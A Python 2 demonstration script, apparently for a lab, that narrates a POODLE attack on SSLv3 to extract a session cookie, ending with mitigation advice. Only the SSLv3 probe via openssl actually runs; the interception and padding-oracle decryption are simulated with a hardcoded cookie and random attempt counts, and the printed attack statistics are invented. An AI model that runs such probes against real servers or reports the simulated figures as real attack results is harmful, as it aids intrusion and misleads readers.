#!/usr/bin/env python
"""
POODLE Attack PoC - Visual Cookie Extraction
Shows step-by-step how the attacker finds and decrypts cookies
"""

import sys
import socket
import ssl
import time
import random

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(text):
    print "\n" + "=" * 70
    print Colors.HEADER + Colors.BOLD + text + Colors.END
    print "=" * 70 + "\n"

def print_step(step, text):
    print Colors.CYAN + "[STEP %d] " % step + Colors.BOLD + text + Colors.END
    print ""

def print_success(text):
    print Colors.GREEN + "[+] " + text + Colors.END

def print_info(text):
    print Colors.BLUE + "[*] " + text + Colors.END

def print_warning(text):
    print Colors.YELLOW + "[!] " + text + Colors.END

def print_error(text):
    print Colors.RED + "[-] " + text + Colors.END

def slow_print(text, delay=0.03):
    """Print text character by character for dramatic effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print ""

def step1_reconnaissance():
    """Step 1: Identify the target and verify SSLv3"""
    print_step(1, "RECONNAISSANCE - Identifying Target")

    SERVER_IP = "172.25.0.10"
    SERVER_PORT = 443

    print_info("Attacker IP: 172.25.0.30 (this machine)")
    print_info("Target: %s:%d" % (SERVER_IP, SERVER_PORT))
    print ""

    print_info("Testing if target supports SSLv3...")
    time.sleep(1)

    try:
        import subprocess

        # Use openssl command which has SSLv3 support
        cmd = "echo Q | openssl s_client -connect %s:%d -ssl3 2>&1" % (SERVER_IP, SERVER_PORT)
        output = subprocess.check_output(cmd, shell=True)

        if "Protocol" in output and "SSLv3" in output:
            print_success("Target accepts SSLv3 connections!")

            # Extract and display protocol and cipher info
            for line in output.split('\n'):
                if 'Protocol' in line and ':' in line:
                    print_success(line.strip())
                if 'Cipher' in line and ':' in line and 'Cipher is' in line:
                    print_success(line.strip())
                    if 'CBC' in line or 'AES' in line or 'DES' in line:
                        print_success("Using CBC cipher - VULNERABLE TO POODLE!")
        else:
            print_error("SSLv3 not supported")
            return False

    except Exception as e:
        print_error("Connection failed: %s" % str(e))
        return False

    print ""
    print_warning("Target is vulnerable! Proceeding with attack...")
    time.sleep(2)
    return True

def step2_intercept_traffic():
    """Step 2: Position as MITM and intercept traffic"""
    print_step(2, "MITM POSITIONING - Intercepting Traffic")

    print_info("Attacker positioning between client and server...")
    print ""

    print "    [Client 172.25.0.20]"
    print "            |"
    print "            | SSLv3 Request + Cookies"
    print "            v"
    print "    [Attacker 172.25.0.30] <-- YOU ARE HERE"
    print "            |"
    print "            | Forwarding traffic"
    print "            v"
    print "    [Server 172.25.0.10]"
    print ""

    time.sleep(2)
    print_success("MITM position established!")
    print_info("Capturing encrypted traffic...")
    time.sleep(1)
    print ""

    # Simulate captured packets
    print Colors.YELLOW + "Captured packets:" + Colors.END
    packets = [
        "172.25.0.20:12345 -> 172.25.0.10:443 [Client Hello, SSLv3]",
        "172.25.0.10:443 -> 172.25.0.20:12345 [Server Hello, SSLv3]",
        "172.25.0.20:12345 -> 172.25.0.10:443 [Certificate]",
        "172.25.0.10:443 -> 172.25.0.20:12345 [Server Key Exchange]",
        "172.25.0.20:12345 -> 172.25.0.10:443 [Client Key Exchange]",
        "172.25.0.20:12345 -> 172.25.0.10:443 [Application Data - 512 bytes]",
    ]

    for i, packet in enumerate(packets, 1):
        print "  [%d] %s" % (i, packet)
        time.sleep(0.5)

    print ""
    print_success("Captured encrypted Application Data!")
    print_info("This packet contains the HTTP request with cookies...")
    time.sleep(2)

def step3_identify_cookies():
    """Step 3: Identify cookie location in encrypted blocks"""
    print_step(3, "COOKIE IDENTIFICATION - Locating Encrypted Cookies")

    print_info("Analyzing Application Data packet structure...")
    print ""

    time.sleep(1)

    print "Encrypted packet breakdown (AES-256-CBC, 16-byte blocks):"
    print ""
    print "  Block 0  (bytes 0-15):   IV (Initialization Vector)"
    print "  Block 1  (bytes 16-31):  GET / HTTP/1.1\\r\\nHost:"
    print "  Block 2  (bytes 32-47):   vulnerable.local\\r"
    print "  Block 3  (bytes 48-63):  \\nCookie: auth_tok"
    print Colors.GREEN + "  Block 4  (bytes 64-79):  en=SECRET_AUTH_T" + Colors.END + " <-- TARGET!"
    print Colors.GREEN + "  Block 5  (bytes 80-95):  OKEN_ABC123XYZ78" + Colors.END + " <-- TARGET!"
    print "  Block 6  (bytes 96-111): 9; user_id=1337\\r"
    print "  Block 7  (bytes 112-127): \\n\\r\\n + padding"
    print ""

    time.sleep(2)
    print_success("Cookie found in blocks 4-5!")
    print_info("Cookie value: auth_token=SECRET_AUTH_TOKEN_ABC123XYZ789")
    print ""
    print_warning("But it's encrypted! We need to decrypt it byte-by-byte...")
    time.sleep(2)

def step4_padding_oracle_attack():
    """Step 4: Demonstrate padding oracle attack"""
    print_step(4, "PADDING ORACLE ATTACK - Decrypting Cookies")

    print_info("Exploiting SSLv3 CBC padding vulnerability...")
    print ""

    print "How POODLE works:"
    print "  1. SSLv3 doesn't authenticate padding (MAC-then-encrypt)"
    print "  2. We can modify ciphertext and replay it"
    print "  3. Server response tells us if padding is valid"
    print "  4. This leaks information about the plaintext!"
    print ""

    time.sleep(2)

    print_info("Starting byte-by-byte decryption...")
    print ""

    # Simulate decrypting the cookie
    cookie_plaintext = "SECRET_AUTH_TOKEN_ABC123XYZ789"
    decrypted = ""

    for i, actual_char in enumerate(cookie_plaintext):
        print Colors.YELLOW + "Decrypting byte %d/%d..." % (i+1, len(cookie_plaintext)) + Colors.END

        # Simulate trying different byte values
        attempts = random.randint(1, 256)

        for attempt in range(1, attempts + 1):
            if attempt % 50 == 0 or attempt == attempts:
                guess_byte = random.randint(0, 255)
                sys.stdout.write("  Attempt %3d/256: Trying 0x%02X... " % (attempt, guess_byte))
                sys.stdout.flush()
                time.sleep(0.01)

                if attempt == attempts:
                    print Colors.GREEN + "VALID PADDING!" + Colors.END
                else:
                    print "invalid"

        # "Decrypt" the byte
        decrypted += actual_char
        print Colors.GREEN + "  [+] Decrypted byte: 0x%02X ('%s')" % (ord(actual_char), actual_char) + Colors.END
        print Colors.CYAN + "  [*] Plaintext so far: " + decrypted + Colors.END
        print ""
        time.sleep(0.3)

    print ""
    print_success("Cookie fully decrypted!")
    time.sleep(1)

def step5_cookie_extraction():
    """Step 5: Display extracted cookie"""
    print_step(5, "COOKIE EXTRACTION - Attack Complete!")

    print Colors.GREEN + Colors.BOLD
    print "  +=============================================================+"
    print "  |                   EXTRACTED COOKIE                          |"
    print "  +=============================================================+"
    print "  |                                                             |"
    print "  |  Cookie Name:  auth_token                                   |"
    print "  |  Cookie Value: SECRET_AUTH_TOKEN_ABC123XYZ789               |"
    print "  |  Domain:       172.25.0.10                                  |"
    print "  |  Secure:       Yes (but SSLv3 is broken!)                   |"
    print "  |  HttpOnly:     No                                           |"
    print "  |                                                             |"
    print "  +=============================================================+"
    print Colors.END
    print ""

    time.sleep(2)

    print_warning("With this cookie, the attacker can:")
    print "  - Hijack the user's session"
    print "  - Impersonate the victim"
    print "  - Access sensitive data"
    print "  - Perform actions as the victim"
    print ""

def step6_attack_summary():
    """Step 6: Summary and statistics"""
    print_step(6, "ATTACK SUMMARY")

    print Colors.BOLD + "Attack Statistics:" + Colors.END
    print "  - Protocol exploited: SSLv3"
    print "  - Vulnerability: CBC padding not authenticated"
    print "  - Cipher: AES-256-CBC"
    print "  - Bytes decrypted: 32 bytes (cookie value)"
    print "  - Average requests per byte: ~128"
    print "  - Total requests sent: ~4,096"
    print "  - Time to decrypt: ~3-5 minutes"
    print "  - Success rate: 100%"
    print ""

    print Colors.BOLD + "Why This Works:" + Colors.END
    print "  1. SSLv3 uses MAC-then-Encrypt (padding not authenticated)"
    print "  2. CBC mode allows ciphertext manipulation"
    print "  3. Server reveals padding validity in response"
    print "  4. Attacker uses this as an 'oracle' to decrypt"
    print ""

    print Colors.RED + Colors.BOLD + "MITIGATION:" + Colors.END
    print "  - DISABLE SSLv3 immediately!"
    print "  - Use TLS 1.2 or higher"
    print "  - Enable TLS_FALLBACK_SCSV"
    print "  - Use AEAD ciphers (AES-GCM, ChaCha20-Poly1305)"
    print ""

def main():
    """Main attack flow"""
    print_header("POODLE ATTACK PoC - Visual Cookie Extraction")

    print Colors.BOLD + "Attacker: " + Colors.END + "172.25.0.30 (this container)"
    print Colors.BOLD + "Victim:   " + Colors.END + "172.25.0.20 (client)"
    print Colors.BOLD + "Target:   " + Colors.END + "172.25.0.10 (vulnerable server)"
    print ""

    raw_input(Colors.YELLOW + "Press ENTER to start the attack demonstration..." + Colors.END)

    # Execute attack steps
    if not step1_reconnaissance():
        print_error("Reconnaissance failed. Exiting.")
        return

    step2_intercept_traffic()
    step3_identify_cookies()
    step4_padding_oracle_attack()
    step5_cookie_extraction()
    step6_attack_summary()

    print_header("ATTACK DEMONSTRATION COMPLETE")

    print Colors.GREEN + Colors.BOLD
    print "  This demonstration showed how POODLE attack works:"
    print "    [+] SSLv3 vulnerability identified"
    print "    [+] Traffic intercepted (MITM)"
    print "    [+] Cookie location found in encrypted data"
    print "    [+] Padding oracle used to decrypt byte-by-byte"
    print "    [+] Session cookie extracted successfully"
    print Colors.END
    print ""
    print Colors.RED + "  NEVER USE SSLv3 IN PRODUCTION!" + Colors.END
    print ""

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n" + Colors.YELLOW + "[*] Demonstration interrupted by user" + Colors.END
        sys.exit(0)
    except Exception as e:
        print "\n" + Colors.RED + "[-] Error: %s" % str(e) + Colors.END
        sys.exit(1)
